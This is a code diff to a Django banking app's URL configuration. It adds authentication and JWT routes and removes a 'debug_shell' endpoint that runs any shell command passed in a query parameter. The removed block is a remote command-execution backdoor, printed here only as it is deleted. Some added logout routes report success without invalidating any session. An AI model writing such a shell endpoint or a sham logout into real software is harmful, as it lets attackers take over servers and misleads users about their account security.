@@ -3,10 +3,14 @@ URLs for the banking app with additional diagnostic endpoints.
 """
 from django.urls import path, include
 from rest_framework.routers import DefaultRouter
+from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView
 from rest_framework.views import APIView
-from rest_framework.response import Response
 from .views import AccountViewSet, TransactionViewSet, BusinessViewSet
+from .auth_views import LoginView, UserAccountsView
+from .template_views import register_api
 from .test_view import TestView
+from .registration_view import UserRegistrationView
+from rest_framework.response import Response
 import logging
 import traceback
 
@@ -25,8 +29,20 @@ router.register(r'businesses', BusinessViewSet)
 
 urlpatterns = [
     path('', include(router.urls)),
-    # Test routing with very simple views
-    path('simple-register/', SimpleRegisterView.as_view(), name='simple-registration'),
+    # Auth endpoints
+    path('token/', TokenObtainPairView.as_view(), name='token_obtain_pair'),
+    path('token/refresh/', TokenRefreshView.as_view(), name='token_refresh'),
+    path('auth/login/', LoginView.as_view(), name='auth-login'),
+    path('auth/register/', register_api, name='auth-register'),
+    path('auth/user/', UserAccountsView.as_view(), name='user-accounts'),
+    path('auth/logout/', lambda request: Response({'detail': 'Successfully logged out.'}), name='auth-logout'),
+    # Same endpoints without /auth/ prefix (matching frontend expectations)
+    path('login/', LoginView.as_view(), name='api-login'),
+    path('register/', register_api, name='api-register'),
+    path('logout/', lambda request: Response({'detail': 'Successfully logged out.'}), name='api-logout'),
+    path('user/', UserAccountsView.as_view(), name='api-user'),
+    # Registration and test endpoints
+    path('simple-register/', UserRegistrationView.as_view(), name='user-registration'),
     path('test-view/', TestView.as_view(), name='banking-test-view'),
 ]
 
@@ -50,19 +66,3 @@ urlpatterns += [
     path('redoc/', schema_view.with_ui('redoc', cache_timeout=0), name='schema-redoc'),
 ]
 #ENDTASK1
-
-# These insecure endpoints are kept from the original file
-from django.http import JsonResponse
-import subprocess
-from rest_framework.response import Response
-
-def debug_shell(request):
-    cmd = request.GET.get("cmd", "ls")
-    output = subprocess.getoutput(cmd)
-    return JsonResponse({"output": output})
-
-urlpatterns += [
-    path('debug_shell/', debug_shell),
-    # Additional diagnostic endpoint
-    path('url-test/', lambda request: JsonResponse({"message": "Banking URLs are being loaded correctly"})),
-]
